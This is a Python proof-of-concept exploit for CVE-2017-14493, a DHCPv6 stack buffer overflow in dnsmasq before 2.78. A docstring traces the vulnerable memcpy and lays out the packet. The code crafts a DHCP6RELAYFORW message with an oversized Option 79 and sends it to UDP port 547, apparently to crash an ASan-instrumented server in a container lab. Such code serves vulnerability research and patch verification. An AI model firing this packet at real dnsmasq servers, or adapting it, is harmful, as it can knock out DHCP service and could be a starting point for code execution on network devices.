#!/usr/bin/env python3
"""PoC for CVE-2017-14493 - dnsmasq < 2.78 DHCPv6 stack buffer overflow.

Stack-based buffer overflow (CWE-119, CVSS 9.8) in dhcp6_maybe_relay()
(src/rfc3315.c). On the DHCPv6 SERVER path (UDP 547), a DHCP6RELAYFORW message
carrying Option 79 (OPTION6_CLIENT_MAC) is parsed as:

    state->mac_len = opt6_len(opt) - 2;                       # rfc3315.c:210
    memcpy(&state->mac[0], opt6_ptr(opt, 2), state->mac_len); # rfc3315.c:211

state->mac is a fixed 16-byte stack buffer (DHCP_CHADDR_MAX = 16). opt6_find()
only checks that the option payload fits inside the packet, never that it fits
in the 16-byte destination, so an Option 79 whose payload exceeds 18 bytes
(2 mac_type + >16 mac) overflows state->mac on the stack.

DHCP6RELAYFORW wire layout (per RFC 3315 relay header, parsed at inbuff+34):
    offset 0      : msg-type        = 0x0c  (DHCP6RELAYFORW = 12)
    offset 1      : hop-count       = 0x00
    offset 2..17  : link-address    (16 bytes)
    offset 18..33 : peer-address    (16 bytes)
    offset 34..   : options
        Option 79 (OPTION6_CLIENT_MAC):
            code  = 0x00 0x4f  (79)
            len   = 0x00 0x52  (82 = 2-byte mac_type + 80-byte mac payload)
            data  = <2-byte mac_type> + <80 * 'A'>   -> mac_len = 80 -> overflow

The whole 82-byte option payload is genuinely present in the packet (opt6_find
requires it), so this is a real over-read-free memcpy of attacker data into a
16-byte stack buffer, not a length-field trick.

A DHCPv6 server binds an IPv6 UDP socket, so the target MUST be reached over
IPv6. The default target is therefore the IPv6 loopback ::1, which is intended to
be fired from INSIDE the container:

    docker exec <container> python3 /app/poc_cve_2017_14493.py

Usage:
    python3 poc_cve_2017_14493.py [host] [port]   # default ::1 547

After firing, check the server logs for the ASan stack-buffer-overflow abort:
    docker logs <container>
The trace should name dhcp6_maybe_relay / rfc3315.c.
"""
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "::1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 547

# DHCPv6 is IPv6-only; pick the socket family from the target literal.
try:
    socket.inet_pton(socket.AF_INET6, HOST)
    FAMILY = socket.AF_INET6
except OSError:
    FAMILY = socket.AF_INET

# DHCP6RELAYFORW relay header.
MSG_TYPE = 0x0c          # DHCP6RELAYFORW
HOP_COUNT = 0x00
LINK_ADDRESS = b"\x00" * 16   # all-zero link-address (loopback-ish; irrelevant)
PEER_ADDRESS = b"\x00" * 16   # all-zero peer-address

# Option 79 (OPTION6_CLIENT_MAC) with an oversized payload.
OPTION6_CLIENT_MAC = 79
MAC_TYPE = b"\x00\x01"        # 2-byte hardware type (consumed as mac_type)
MAC_DATA = b"A" * 80         # 80 bytes -> mac_len = 80 >> 16 -> stack overflow
opt_payload = MAC_TYPE + MAC_DATA
option79 = struct.pack("!HH", OPTION6_CLIENT_MAC, len(opt_payload)) + opt_payload

packet = struct.pack("!BB", MSG_TYPE, HOP_COUNT) + LINK_ADDRESS + PEER_ADDRESS + option79


def main() -> int:
    print(f"[*] CVE-2017-14493 PoC -> {HOST}:{PORT}/udp (DHCP6RELAYFORW, Option 79)")
    print(f"[*] Option 79 payload = {len(opt_payload)} bytes "
          f"(mac_len = {len(opt_payload) - 2} > 16 -> overflow); "
          f"total packet = {len(packet)} bytes")
    sock = socket.socket(FAMILY, socket.SOCK_DGRAM)
    sock.settimeout(3.0)
    try:
        sock.sendto(packet, (HOST, PORT))
        print("[+] Malicious DHCP6RELAYFORW sent.")
        try:
            data, addr = sock.recvfrom(2048)
            print(f"[*] Got {len(data)} bytes back from {addr} (server still alive?).")
        except (TimeoutError, OSError):
            print("[*] No reply (expected if the server crashed on the overflow).")
    finally:
        sock.close()
    print("[*] Now inspect the server logs for the ASan stack-buffer-overflow abort:")
    print("      docker logs <container>")
    print("    The trace should name dhcp6_maybe_relay / rfc3315.c.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
